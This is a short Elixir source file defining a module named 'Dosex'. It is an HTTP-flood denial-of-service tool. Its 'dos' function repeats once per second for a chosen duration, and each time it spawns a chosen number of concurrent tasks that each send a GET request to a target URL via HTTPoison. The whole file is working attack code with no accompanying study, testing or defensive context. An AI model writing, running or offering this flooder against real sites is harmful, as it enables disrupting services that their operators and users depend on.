defmodule Dosex do
  @moduledoc """
  Documentation for `Dosex`.
  """

  @doc """

  """
  def dos(url, number_of_proc, duration) do
    case duration do
      0 -> :finished
      _ -> 
        :timer.sleep 1000
        Task.start(fn -> spawn_task(1..number_of_proc, fn -> HTTPoison.get!(url) end) end)
        dos(url, number_of_proc, (duration - 1))
    end
      
  end

  def spawn_task(task_range, func) do
    task_range
    |> Enum.map(fn _ -> Task.start(fn -> func.() end) end)
  end

end
